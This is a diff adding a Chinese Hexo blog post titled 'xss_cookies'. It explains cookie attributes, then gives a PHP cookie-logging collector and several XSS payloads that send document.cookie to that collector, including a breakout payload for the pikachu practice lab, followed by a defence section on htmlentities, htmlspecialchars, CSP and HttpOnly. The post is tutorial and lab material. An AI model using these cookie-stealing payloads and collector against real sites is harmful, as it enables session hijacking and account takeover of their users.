@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+
+
+
+
+  <meta name="description" content="xss Cookie获取 先来了解一下cookie属性：name、value、expires、domain、path、secure、max-age、HttpOnly。  name name 属性是必需的，它是一个键值对，用于指定Cookie的键。  value value 属性是必需的，它是一个键值对，用于指定Cookie的值。expires  expires  属性用于指定Cookie过期时间。">
+<meta name="keywords" content="杂项">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss_cookies">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/xss-cookies/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="xss Cookie获取 先来了解一下cookie属性：name、value、expires、domain、path、secure、max-age、HttpOnly。  name name 属性是必需的，它是一个键值对，用于指定Cookie的键。  value value 属性是必需的，它是一个键值对，用于指定Cookie的值。expires  expires  属性用于指定Cookie过期时间。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/04/22/xss-cookies/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/22/xss-cookies/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/22/xss-cookies/3.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/6230889-678390ac7147eb2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/372/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/6230889-038c78407caae5d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/284/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/6230889-4a47fed989a18325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/499/format/webp">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/6230889-0b0257806e619f56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400/format/webp">
+<meta property="og:updated_time" content="2019-04-22T11:52:53.185Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss_cookies">
+<meta name="twitter:description" content="xss Cookie获取 先来了解一下cookie属性：name、value、expires、domain、path、secure、max-age、HttpOnly。  name name 属性是必需的，它是一个键值对，用于指定Cookie的键。  value value 属性是必需的，它是一个键值对，用于指定Cookie的值。expires  expires  属性用于指定Cookie过期时间。">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/22/xss-cookies/2.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/22/xss-cookies/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>xss_cookies | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-杂项">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/杂项/" rel="section"><i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>杂项</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/xss-cookies/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="erlee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss_cookies
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-22 19:26:32 / 修改时间：19:52:53" itemprop="dateCreated datePublished" datetime="2019-04-22T19:26:32+08:00">2019-04-22</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/杂项/" itemprop="url" rel="index"><span itemprop="name">杂项</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="xss-Cookie获取"><a href="#xss-Cookie获取" class="headerlink" title="xss Cookie获取"></a>xss Cookie获取</h1><hr>
+<p><strong>先来了解一下cookie属性：name、value、expires、domain、path、secure、max-age、HttpOnly。</strong></p>
+<ul>
+<li><p><strong>name name</strong></p>
+<p>属性是必需的，它是一个键值对，用于指定Cookie的键。</p>
+</li>
+<li><p><strong>value value</strong></p>
+<p>属性是必需的，它是一个键值对，用于指定Cookie的值。expires</p>
+</li>
+<li><p><strong>expires</strong> </p>
+<p>属性用于指定Cookie过期时间。它采用UTC或GMT格式，比如通过new</p>
+<p>date().toUTCString()或new Date().toGMTString()获取到的Thu, 09 Aug 2018 03:17:40 GMT。 如果不设置该属性，或者设为null，Cookie只在当前会话（session）有效，浏览器窗口一旦关闭，当前Session结束，该Cookie就会被删除。 浏览器根据本地时间，决定Cookie是否过期，由于本地时间是不精确的，所以没有办法保证Cookie一定会在服务器指定的时间过期</p>
+</li>
+<li><p><strong>domain</strong><br>domain属性指定Cookie所在的域名，比如example.com或subdomain.example.com。 如果未指定，默认为设定该Cookie的域名。所指定的域名必须是当前发送Cookie的域名的一部分，比如当前访问的域名是example.com，就不能将其设为google.com。只有访问的域名匹配domain属性，Cookie才会发送到服务器。</p>
+</li>
+<li><p><strong>path</strong><br>path属性用来指定路径，必须是绝对路径（比如/、/mydir），如果未指定，默认为请求该Cookie的网页路径。 只有path属性匹配向服务器发送的路径，Cookie才会发送。这里的匹配不是绝对匹配，而是从根路径开始，只要path属性匹配发送路径的一部分，就可以发送。比如，path属性等于/blog，则发送路径是/blog或者/blogroll，Cookie都会发送。path属性生效的前提是domain属性匹配。</p>
+</li>
+<li><p><strong>secure</strong><br>secure属性用来指定Cookie只能在加密协议HTTPS下发送到服务器。 该属性只是一个开关，不需要指定值。如果通信是HTTPS协议，该开关自动打开。</p>
+</li>
+<li><p><strong>max-age</strong> </p>
+<p>max-age属性用来指定Cookie有效期，比如60 <em> 60 </em> 24 * 365 （即一年31536000秒） 正常情况下，max-age的优先级高于expires，但是二者有一些细微差别。</p>
+</li>
+<li><p><strong>HttpOnly</strong><br>HttpOnly属性用于设置该Cookie不能被JavaScript读取. （即document.cookie不会返回这个Cookie的值），只用于向服务器发送。 <code>Set-Cookie: key=value; HttpOnly</code> </p>
+</li>
+</ul>
+<p>首先我们需要一段php 代码来获取cookie以及ip并且生成一个cookie.txt文件</p>
+<p>cookie.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$ip = getenv (&apos;REMOTE_ADDR&apos;);</span><br><span class="line">$time = date(&apos;Y-m-d g:i:s&apos;);</span><br><span class="line">$fp = fopen(&quot;cookie.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在存在XSS的地方 这样书 这样书写 (加入getcookie.php在你的根目录)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/cookie.php?cookie=&apos;+document.cookie+&apos;&quot; width=0 height=0&lt;/script&gt;;</span><br></pre></td></tr></table></figure>
+<p>当加号被过滤时</p>
+<p>cookie.js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&apos;img&apos;);</span><br><span class="line">img.width = 0;</span><br><span class="line">img.height = 0;</span><br><span class="line">img.src = &apos;http://127.0.0.1/coookie.php?joke=&apos;+encodeURIComponent(document.cookie);</span><br></pre></td></tr></table></figure>
+<p>getcookie.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @ini_set(&apos;display_errors&apos;,1);</span><br><span class="line">    $str = $_GET[&apos;joke&apos;];</span><br><span class="line">    $filePath = &quot;cookie.txt&quot;;</span><br><span class="line"></span><br><span class="line">    if(is_writable($filePath)==false)&#123;</span><br><span class="line">         echo &quot;can&apos;t write&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">          $handler = fopen($filePath, &quot;a&quot;);</span><br><span class="line">          fwrite($handler, $str.&quot;\n&quot;);</span><br><span class="line">          fclose($handler);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/cookie.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="pikachu-xss-之js输出"><a href="#pikachu-xss-之js输出" class="headerlink" title="pikachu xss 之js输出"></a>pikachu xss 之js输出</h5><p>先试一下 <script>alert(1)</script></p>
+<p>果然没有输出，查看元素也没有，然后正常输如看下  输入<1213456></1213456></p>
+<p><img src="2.png" alt></p>
+<p>考虑闭合语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;alert(document.cookie)// 可以弹出</span><br></pre></td></tr></table></figure>
+<p>获取cookie </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;;window.location.href=&apos;http://127.0.0.1/cookie.php?cookie=&apos;+document.cookie//</span><br><span class="line">&apos;;s=document.createElement(&apos;script&apos;);document.getElementsByTagName(&apos;body&apos;)[0]</span><br><span class="line">.appendChild(s);s.src=&apos;http://127.0.0.1/cookie.php?cookie=&apos;+document.cookie;//</span><br></pre></td></tr></table></figure>
+<p>这些只能在本地获取，不能获公网的，如果你有没有vps可以考虑在线xss平台</p>
+<p>网上很多，百度就行，使用方法看看也就能懂</p>
+<h2 id="四、XSS漏洞防范"><a href="#四、XSS漏洞防范" class="headerlink" title="四、XSS漏洞防范"></a>四、XSS漏洞防范</h2><h3 id="4-1-反射型xss漏洞防范"><a href="#4-1-反射型xss漏洞防范" class="headerlink" title="4.1 反射型xss漏洞防范"></a>4.1 反射型xss漏洞防范</h3><p>php中xss的漏洞防范方法总结：&lt;参考自Segmentfault&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">A.PHP直接输出html的，可以采用以下的方法进行过滤：</span><br><span class="line"></span><br><span class="line">    1.htmlspecialchars函数</span><br><span class="line">    2.htmlentities函数</span><br><span class="line">    3.HTMLPurifier.auto.php插件</span><br><span class="line">    4.RemoveXss函数</span><br><span class="line"></span><br><span class="line">B.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤：</span><br><span class="line"></span><br><span class="line">    1.尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容</span><br><span class="line">    2.必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤</span><br><span class="line"></span><br><span class="line">C.其它的通用的补充性防御手段</span><br><span class="line"></span><br><span class="line">    1.在输出html时，加上Content Security Policy的Http Header</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）</span><br><span class="line">    （缺陷：IE或低版本的浏览器可能不支持）</span><br><span class="line">    2.在设置Cookie时，加上HttpOnly参数</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）</span><br><span class="line">    （缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）</span><br><span class="line">    3.在开发API时，检验请求的Referer参数</span><br><span class="line">    （作用：可以在一定程度上防止CSRF攻击）</span><br><span class="line">    （缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）</span><br></pre></td></tr></table></figure>
+<p>这里我们选用<code>htmlentities()</code>函数进行测试：</p>
+<blockquote>
+<p>htmlentities() 函数把字符转换为 HTML 实体。</p>
+</blockquote>
+<p>新建Xss_htmlentities.php， 代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;input&quot;&gt;     </span><br><span class="line">&lt;input type=&quot;submit&quot;&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$XssReflex = $_GET[&apos;input&apos;];</span><br><span class="line">echo &apos;output:&lt;br&gt;&apos;.htmlentities($XssReflex);#仅在这里对变量 $XssReflex 做了处理.</span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>在Firefox输入url：<code>localhost/codoaudit/xss/Xsshtmlentities.php</code> :</p>
+<p><img src="4.png" alt="img"></p>
+<p>当我们输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ：</p>
+<p><img src="3.png" alt="img"></p>
+<p>可以看到页面并没有弹窗。<br> 我们再查看网页html代码：</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/6230889-678390ac7147eb2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/372/format/webp" alt="img"></p>
+<p>可以看到htmlentities()函数对用户输入的<code>&lt;&gt;</code>做了转义处理,恶意代码当然也就没法执行了。<br> 还有其他过滤函数，纸上学来终觉浅，有兴趣的同学可以自己去尝试一番</p>
+<h3 id="4-2-存储型xss漏洞防范"><a href="#4-2-存储型xss漏洞防范" class="headerlink" title="4.2 存储型xss漏洞防范"></a>4.2 存储型xss漏洞防范</h3><p>存储型XSS对用户的输入进行过滤的方式和反射型XSS相同，这里我们使用<code>htmlspecialchars()</code>函数进行演示：</p>
+<blockquote>
+<p>htmlentities() :把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p>
+</blockquote>
+<p>htmlspecialchars和htmlentities的区别：</p>
+<p><code>htmlspecialchars</code> 只转义 <code>&amp; 、&quot; 、&#39; 、&lt; 、&gt;</code> 这几个html代码，而 <code>htmlentities</code> 却会转化所有的html代码，连同里面的它无法识别的中文字符也会转化。</p>
+<p>新建Xss_htmlspecialchars_Storage.php ，代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style=&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;XssStorage&lt;/title&gt;  </span><br><span class="line">&lt;/head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Message Board&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;Xss_htmlspecialchars_Storage.php&quot; method=&quot;post&quot;&gt;  </span><br><span class="line">Message:&lt;textarea id=&apos;Mid&apos; name=&quot;desc&quot;&gt;&lt;/textarea&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">Subuser:&lt;input type=&quot;text&quot; name=&quot;user&quot;/&gt;&lt;br&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; onclick=&apos;loction=&quot;XssStorage.php&quot;&apos;/&gt;  </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&apos;user&apos;])&amp;&amp;isset($_POST[&apos;desc&apos;]))&#123;  </span><br><span class="line">$log=fopen(&quot;sqlStorage.txt&quot;,&quot;a&quot;);  </span><br><span class="line">fwrite($log,htmlspecialchars($_POST[&apos;user&apos;]).&quot;\r\n&quot;); # 在此对用户输入数据$_POST[&apos;user&apos;]进行过滤</span><br><span class="line">fwrite($log,htmlspecialchars($_POST[&apos;desc&apos;]).&quot;\r\n&quot;); # 在此对用户输入数据$_POST[&apos;desc&apos;]进行过滤</span><br><span class="line">fclose($log);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;sqlStorage.txt&quot;))  </span><br><span class="line">&#123;  </span><br><span class="line">$read= fopen(&quot;sqlStorage.txt&quot;,&apos;r&apos;);  </span><br><span class="line">while(!feof($read))  </span><br><span class="line">&#123;  </span><br><span class="line">    echo fgets($read).&quot;&lt;/br&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">fclose($read);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure>
+<p>在Firefox输入url：<code>localhost/codoaudit/xss/Xss_htmlspecialchars_Storage.php</code> :</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/6230889-038c78407caae5d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/284/format/webp" alt="img"></p>
+<p>当我们在Message中输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ：</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/6230889-4a47fed989a18325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/499/format/webp" alt="img"></p>
+<p>可以看到页面并没有弹窗。<br> 我们再查看网页html代码：</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/6230889-0b0257806e619f56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400/format/webp" alt="img"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+	
+	<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+
+    
+
+    
+      
+    
+    
+
+    
+
+
+
+
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/杂项/" rel="tag"><i class="fa fa-tag"></i> 杂项</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/xss-1/" rel="next" title="xss_1">
+                <i class="fa fa-chevron-left"></i> xss_1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/22/xss-bypass/" rel="prev" title="xss_bypass">
+                xss_bypass <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">erlee</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">分类</span>
+                  
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/sleepywater" title="GitHub &rarr; https://github.com/sleepywater" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
